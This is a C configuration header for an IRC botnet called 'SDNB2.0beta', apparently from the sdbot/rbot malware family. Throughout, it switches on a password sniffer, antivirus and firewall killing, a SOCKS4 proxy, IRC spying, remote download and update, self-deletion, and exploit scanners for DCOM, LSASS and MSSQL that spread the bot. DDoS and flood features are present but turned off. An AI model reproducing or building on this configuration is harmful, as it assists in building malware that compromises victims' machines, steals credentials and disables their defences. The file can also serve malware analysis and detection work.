#define vername "SDNB2.0beta"

//DDoS
//#undef NO_DDOS // disables DDOS
//#undef NO_ICMP // disables ICMP flood.

// Sniffer
#undef NO_PSNIFF // disables Sniffer.
#undef NO_PROCESS
#undef NO_AVFW_KILL
// Socks4
#undef NO_SOCK4SERV // disables socks4 server.

//system info
#undef NO_NETINFO    // disables network info function
#undef NO_SYSINFO    // disables system info function

//misc
#define NO_REALNICK
#define NO_IDENT      // disables ident server
#undef NO_SPY        // disables irc spy function
//#undef NO_REDIRECT   // disables port redirect function
#undef NO_DOWNLOAD   // disables downloading/updating functions
#undef NO_VISIT      // disables visiting URLs
#undef NO_CONNCHECK  // disables check for internet connection
#define LOGSIZE			128
#define MAXSTRLEN		500

//bot monitors
#define NO_REGMON	// disables registry monitor
//#define NO_SECSYSTEM
#define NO_TASKHIDER // disables hiding from taskmanager

//scanners
#undef NO_FTPD
#undef NO_ADVSCAN
//#undef NO_LSASS
//#undef NO_LSASS1
//#undef NO_LSASS1LSASS
//#undef NO_IMAIL
//#undef NO_MSSQL
//#undef NO_DCOM135LSASS
#undef NO_DCOM
#undef NO_SYN
//#undef NO_MSSQLLSASS

#define IRCLINE			1024
#define MAXTHREADS		500
#define MAXNICKLEN		28
#define LOGLINE			128
#define MAXSCANTHRD		203
#define MAXSCANTIME		800
//#define NO_ICMP
#define NO_REDIRECT
#define NO_DDOS

//dont mess with this - this is just to remove sploits if there is no scanner
#ifdef NO_ADVSCAN
//#define NO_LSASS
//#define NO_IISSL
//#define NO_IMAIL
#endif
#undef NO_MELT

#define AMPM(x) ((x>12)?("PM"):("AM"))
#define HOUR(x) ((x>12)?(x-12):(x))
#define BLOCKSIZE		512 //tftp

//#define NO_SYSINFO    // disables system info function

#define HSTART "\3\x30\x32"
#define HEND "\3"
#define FLOOD_DELAY 2000
#define MAX_LINES 500
#define MAXTOKENS		32